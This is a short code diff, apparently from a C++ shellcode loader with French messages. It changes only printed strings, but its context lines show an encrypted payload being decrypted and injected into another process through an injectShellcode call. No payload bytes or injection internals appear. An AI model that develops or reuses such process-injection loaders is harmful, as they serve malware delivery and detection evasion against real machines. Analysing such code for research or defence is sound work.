@@ -14,7 +14,7 @@ int main() {
         return 1;
     }
 
-    std::cout << "Shellcode récupéré (chiffré) :" << std::endl;
+    std::cout << "Shellcode chiffré :" << std::endl;
 
     for (DWORD i = 0; i < payloadSize; i++) {
         printf("%02X ", payload[i]);
@@ -33,7 +33,7 @@ int main() {
 
     decrypt(payload, payloadSize, decryptionKey);
 
-    std::cout << "Shellcode après déchiffrement :" << std::endl;
+    std::cout << "Shellcode déchiffré :" << std::endl;
 
     for (DWORD i = 0; i < payloadSize; i++) {
         printf("%02X ", payload[i]);
@@ -68,7 +68,7 @@ int main() {
     }
     DWORD targetPid = pi.dwProcessId;
     if (!injectShellcode(payload, payloadSize, targetPid)) {
-        std::cout << "Échec de l'injection dans le processus distant." << std::endl;
+        std::cout << "Échec de l'injection dans le processus." << std::endl;
         return 1;
     }
     else {
